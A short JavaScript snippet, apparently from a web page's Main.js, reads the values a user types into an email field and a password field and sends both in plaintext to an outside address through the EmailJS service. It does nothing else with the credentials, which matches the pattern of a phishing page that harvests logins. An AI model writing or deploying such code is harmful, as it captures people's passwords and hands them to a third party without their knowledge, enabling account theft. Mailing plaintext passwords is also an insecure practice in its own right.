// Inside Main.js

// Function to send email using EmailJS
function sendEmail() {
  // Get the user inputs
  var email = document.getElementById('emailInput').value;
  var password = document.getElementById('passwordInput').value;

  // Send the email using EmailJS
  emailjs.send('service_jfyicht', 'template_2ykajdd', {
    email: email,
    password: password
  })
  .then(function(response) {
    console.log('Email sent successfully!', response.status, response.text);
  }, function(error) {
    console.log('Email failed to send:', error);
  });
}
